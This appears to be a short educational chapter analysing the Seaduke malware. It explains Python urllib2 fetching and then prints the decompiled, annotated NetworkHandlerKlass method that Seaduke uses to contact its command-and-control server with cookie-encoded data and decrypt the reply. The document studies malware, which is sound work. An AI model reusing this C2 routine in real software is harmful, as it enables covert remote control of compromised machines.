# fetching resources with urllib
urllib makes it easy to [fetch internet resources](https://docs.python.org/2/howto/urllib2.html) from a given url:
```python
# create "opener" (OpenerDirector instance)
opener = urllib2.build_opener(handler)

# use the opener to fetch a URL
opener.open(a_url)
```
seaduke's [main()](https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L2183) relies on `NetworkHandlerKlass` to [fetch a resource](https://github.com/mynameisvinn/Seaduke/blob/master/chapters/fetch.md) (presumably containing further instructions) from a command and control server.
```python
class NetworkHandlerKlass(object):

    def __send_request(self,**ps):  # https://github.com/pan-unit42/iocs/blob/29cfa76babf29d1eb754a1706526b5aa97d4607b/seaduke/decompiled.py#L1446
        url = ps.pop('url',self.url)
        encoded_cookie_data = None
        dqy = None
        if ps:
            encoded_cookie_data = self.__encode_cookie(ps)

        # windows 
        if botKlass.current_transport=='wininet':
            pass
            pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze=HttpKlass(url,self.user_agent)
            dqy=pSsWAYdKJqgPHbRoVCwjkvMcmtuxInGEhaFfLBXUOrNlTQiyze.send_request(encoded_cookie_data,self.referer)

        # linux
        else:
            pass
            pd = urllib2_build_opener()  # https://docs.python.org/2/howto/urllib2.html
            pd.addheaders=[('User-agent',self.user_agent)]
            if encoded_cookie_data:
                pd.addheaders.append(('Cookie',encoded_cookie_data))
            if self.referer:
                pass
            pz = pd.open(url)
            dqy = pz.read()  # ATTENTION: this is the resource retreived from url
            yed = pz.info().get('Content-Encoding')
            if yed:
                dqy = CryptoKlass.unpack_data(dqy, yed)
        return dqy  # encrypted response to be decrypted by NetworkHandlerKlass
```
